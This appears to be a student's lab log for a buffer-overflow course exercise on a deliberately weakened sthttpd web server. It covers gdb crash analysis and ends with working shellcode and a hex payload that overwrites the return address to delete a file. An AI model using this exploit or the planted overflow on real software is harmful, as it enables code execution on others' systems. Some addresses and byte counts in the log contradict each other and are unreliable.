@@ -1,0 +1,472 @@
+$ which gcc
+/usr/local/cs/bin/gcc
+
+The gcc start path is correct.
+
+$ wget http://web.cs.ucla.edu/classes/spring17/cs33
+/lab/sthttpd-2.27.0.tar.gz
+
+First, I download the required file from the website.
+
+$ cd sthttpd-2.27.0
+$ cd src
+
+change the direction into folder
+
+$ emacs thttpd.c
+To fix the bug I applied the patch
+
+Before: char line[10000];
+After: char line[100];
+
+Before: while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
+After: while ( fgets( line, 1000, fp ) != (char*) 0 
+
+Before: (void) strcpy( str, &str[7] );
+After: (void) memmove( str, &str[7], strlen (&str[7]) + 1 );
+
+$ cd ..
+
+$ ./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc
+-dumpversion)/lib"
+
+configure it with the shell command
+
+Then I compile it three times
+
+1) (SP) for strong stack protection
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+
+2) (AS) for address sanitization
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+
+3) (NO) for neither
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd src/thttpd-no
+
+Then i used formula (12330 + 3 * (X % 293) + Y) to calculate
+I got
+
+SP: 12565
+AS: 12566
+NO: 12567
+
+Then I change to the src folder and create a test file
+
+$ emacs test.txt
+
+I typed in something test thing
+
+This is a test file
+It should do something
+haha
+
+$ src/thttpd-sp -p 12565 -D
+
+Then I opened another putty terminal then
+run the command.
+$ curl http://localhost:12565/src/test.txt
+
+The result is:
+This is a test file
+It should do something
+haha
+
+$ src/thttpd-as -p 12566 -D
+
+Then I opened another putty terminal then
+run the command.
+$ curl http://localhost:12566/src/test.txt
+
+The result is:
+This is a test file
+It should do something
+haha
+
+$ src/thttpd-no -p 12567 -D
+
+Then I opened another putty terminal then
+run the command.
+$ curl http://localhost:12567/src/test.txt
+
+The result is:
+This is a test file
+It should do something
+haha
+
+Since all the results are correct, the servers work
+properly.
+
+Problem 1)
+
+$ emacs config.txt
+
+In the sthttpd-2.27.0 folder I created a file to crash the SP by invoking
+In the config.txt it is a very long string in one line.
+"debug debug debug .... debug" more than 100 characters.
+
+Then I run
+
+$ src/thttpd-sp -p 12565 -C config.txt
+*** stack smashing detected ***: src/thttpd-sp terminated
+Segmentation fault
+
+$ gdb src/thttpd-sp
+Using the gdb to run the program.
+
+(gdb) r  -p 12565 -D -C config.txt
+*** stack smashing detected ***: /w/home.15/cs/ugrad/
+qiusi/smash/sthttpd-2.27.0/src/thttpd-sp terminated
+
+This casued program crashed because the program overwrote
+a canary value so the stack was not using properly
+Since the length is loner than 100 so the memory are
+allocated. Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+(gdb) bt
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x0000006775626564 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+So 0x00007ffff6db3118 is where the function overwriten by config.txt
+Then I decided to run it again.
+
+I reenter the gdb
+$ gdb src/thttpd-sp
+
+Then I set a break point at line 1188 just before the function.
+$ break 1188
+$ set disassemble-next-line on
+
+Then I run the command
+(gdb) run -p 12565 -D -C config.txt
+
+1189        (void) fclose( fp );
+=> 0x0000000000404f1b <read_config+1211>:       4c 89 e7        mov    %r12,%rdi
+   0x0000000000404f1e <read_config+1214>:       e8 1d d5 ff ff  callq  0x402440
+  <fclose@plt>
+
+using si and ni to go through the file
+Finally I got.
+
+Problem 2)
+
+0x00000000004024b0 <__stack_chk_fail@plt+0>: ff 25 42 2c 21 00       jmpq   *0x212c42(%rip)
+# 0x6150f8 <__stack_chk_fail@got.plt>
+
+Problem 3)
+
+Those code compared the canary value in order to detect the
+buffer overflow, and the last code is showing the
+machine catch a buffer overflow. so 0x6150f8 <__stack_chk_fail@plt> is called
+and throw out a error message and the program terminated.
+
+
+Problem 4)
+
+I used the same config.txt to crash it.
+In the config.txt it is a very long string in one line.
+"debug debug debug .... debug" more than 100 characters.
+
+Problem 5)
+$ src/thttpd-as -p 12566 -C config.txt
+
+Starting program: /w/home.15/cs/ugrad/qiusi/lab3/sthttpd-2.27.0/src
+/thttpd-as -p 12566 -D -C config.txt
+
+==43566==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcf54
+at pc 0x00000043aec9 bp 0x7fffffffceb0 sp 0x7fffffffc660
+READ of size 415 at 0x7fffffffcf54 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+(gdb) bt
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffbdd0, pc=4435657, max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false,
+    context=0x0, bp=140737488342704, pc=4435657, max_depth=256,
+    stack=0x7fffffffbdd0)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>,
+    bp=bp@entry=140737488342704, sp=sp@entry=140737488340576,
+    addr=addr@entry=140737488342868, is_write=is_write@entry=false,
+    access_size=access_size@entry=415, exp=<optimized out>,
+    fatal=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>,
+    c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+
+From #6 0x00000000004e0b51 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+I know the address 0x00000000004e0b51 has the problem.
+
+Then I use
+(gdb)disas 0x00000000004e0b51
+
+I found
+
+Problem 5)
+0x00000000004e0b4c <+188>:   callq  0x43b080 <__interceptor_strchr(char const*, int)>
+
+Problem 6)
+From this sentence we know that the crush is caused by __interceptor_strchr
+function. It calls a C library function strchr to traverses through the array
+causes a memory access out of bounds. Sanitizer recogonize it as a 
+stack buffer overflow.
+
+Problem 7)
+I used the same config.txt to crash it.
+In the config.txt it is a very long string in one line.
+"debug debug debug .... debug" more than 100 characters.
+
+$src/thttpd-no -p 12567 -C config.txt
+Segmentation fault
+
+I use gdb running the thttpd-no function
+$ geb src/thttpd-no
+
+Then i run
+run -p 12567 -D -C config.txt
+
+Starting program: /w/home.15/cs/ugrad/qiusi/lab3/sthttpd-2.27.0
+/src/thttpd-no -p 12567 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+
+(gdb) bt
+
+#0  0x0000000000404d9f in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x0000006775626564 in ?? ()
+#7  0x0000000000000000 in ?? ()
+
+I found that memory address 0x0000000000404d9f  may cause the problem
+From the sentence:
+#0  0x0000000000404d9f in read_config (filename=<optimized out>)
+
+(gdb) disas 0x0000000000404d9f
+
+I see an arrow before the retq function
+
+Problem 8)
+=> 0x0000000000404d9f <+1215>:  retq
+
+Problem 9)
+So this is where it cause the crush. After the read_config returned the value
+%rip set the value back to stack and it is just before called the read_config
+function. It caused read_config buffer overflow. Then %rip points to a location
+that not correct. That caused the program crushed.
+
+
+I need to get the assembly code.
+
+$ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd.o src/thttpd-sp.s
+$ make clean
+
+I got src/thttpd-sp.s
+
+$ make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+$ mv src/thttpd.o src/thttpd-as.s
+$ make clean
+
+I got thttpd-as.s
+
+$ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd.o src/thttpd-no.s
+$ make clean
+
+I got thttpd-no.s
+
+Then I used following command to compare the difference.
+
+diff -u thttpd-as.s thttpd-sp.s > as-sp.diff
+diff -u thttpd-no.s thttpd-sp.s > no-sp.diff
+diff -u thttpd-no.s thttpd-as.s > no-as.diff
+
+Comparing those code, -sp and -no are nearly the same. But the -as
+is totally different. And its length is twice as much as the other two.
+
+Problem 10)
+
+-fstack-protector-strong
+It is used to check buffer overrun use of canaries.
+After it call read_config function it calls _stack_chk_fail()
+IT did not requires extra code to read buffer in. So it will not
+affect the assembly code. So the "sp" and "no" looks like almost the
+same. The difference is "sp" need to check canary value.
+
+-fsanitize=address
+It is used to check memory overrides and will return an error message
+If it exists a memory override. handle_read need to check address
+is whether shadow or not. If it is a shallow, it deleted the value
+and sets it as a segmentation fault. This the reason as to check shadow
+memory repeatedly. The "as" is longer and twice longer than the other two.
+
+Problem 11)
+
+$ emacs name.txt
+
+creat a txt file that contains "target.txt"
+
+open gdb
+
+$ gdb src/thttpd-no
+
+(gdb) break read_config
+set up a break point read_config function.
+
+(gdb) run -p 12567 -D -C name.txt
+
+Then I got
+
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=0x7fffffffe639 "name.txt")
+    at thttpd.c:1000
+1000        {
+=> 0x00000000004048e0 <read_config+0>:  41 56   push   %r14
+   0x00000000004048e2 <read_config+2>:  41 55   push   %r13
+
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffd010
+
+I got the starting position of the array.
+It is 10 d0 ff ff ff 7f 00 00
+
+(gdb) info register $rsp
+rsp            0x7fffffffd0a8   0x7fffffffd0a8
+
+I get the address of register rsp it is the starting
+position of the function.
+
+The difference is:
+0x7fffffffd0a8 - 0x7fffffffd010 = 0x98
+0x98  = 152
+So that I need 152 bytes to get to the return address
+
+Then I want to get teh hex value of target.txt and its
+assembly code.
+
+$ emacs test.txt
+
+$ gcc -c test.s
+$ objdump -d test.o
+
+0000000000000000 <main>:
+   0:   55                      push   %rbp
+   1:   48 89 e5                mov    %rsp,%rbp
+   4:   48 b8 74 61 72 67 65    movabs $0x742e746567726174,%rax
+   b:   74 2e 74
+   e:   48 89 45 f0             mov    %rax,-0x10(%rbp)
+  12:   66 c7 45 f8 78 74       movw   $0x7478,-0x8(%rbp)
+  18:   c6 45 fa 00             movb   $0x0,-0x6(%rbp)
+  1c:   b8 00 00 00 00          mov    $0x0,%eax
+  21:   5d                      pop    %rbp
+  22:   c3                      retq
+
+From this line
+4:   48 b8 74 61 72 67 65    movabs $0x742e746567726174,%rax
+
+So the hex value of is of the string
+74 61 72 67 65 74 2e 78 74 00
+since it is 11 bytes
+
+0x7fffffffd0a8 -16 = 0x7fffffffd098
+
+Then I need to find the disassembly code for exploit.
+$ emacs call.s
+
+movq    $0x7fffffffd0a8, %rdi
+movq    $0x57, %rax
+syscall
+
+$ gcc -c call.s
+$ objdump -d call.o
+
+0000000000000000 <.text>:
+   0:   48 bf 98 d0 ff ff ff    movabs $0x7fffffffd0a8,%rdi
+   7:   7f 00 00
+   a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+  11:   0f 05                   syscall
+
+
+
+The start of array is 0x7fffffffd010
+and the return address is 0x7fffffffd0a8
+And I filled up with 00 to get enough bytes
+
+$ emacs hex.txt
+00 00 00 48 bf 98 d0 ff ff ff 7f 00 00 48 c7 c0 57 
+00 00 00 0f 05 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 74 61 72 67 65 
+74 2e 74 78 74 00 00 00 00 00 00 b8 ce ff ff ff 7f
+00 00
+
+Then I need to convert it to hex to raw
+
+$ emacs final.txt
+Then I created a file called final.txt
+I enter the "port="
+
+$ ./hex2raw < hex.txt >> final.txt
+using emacs to go into that file and delte the newline.
+
+All the prepared works are finished.
+Start to exploit
+
+$ gdb src/thttpd-no
+(gdb) run -p 12567 -D -C final.txt
+Starting program: /w/home.15/cs/ugrad/qiusi/lab3/sthttpd-2.27.0/src
+/thttpd-no -p 12567 -D -C final.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+
+It has the segmentation fault
+$ ls target.txt
+and the target.txt file has gone.
+
+The lab parts are all finished.
+
+Finally I add newlines in three .s file to make it less than 200
+charcters a line.
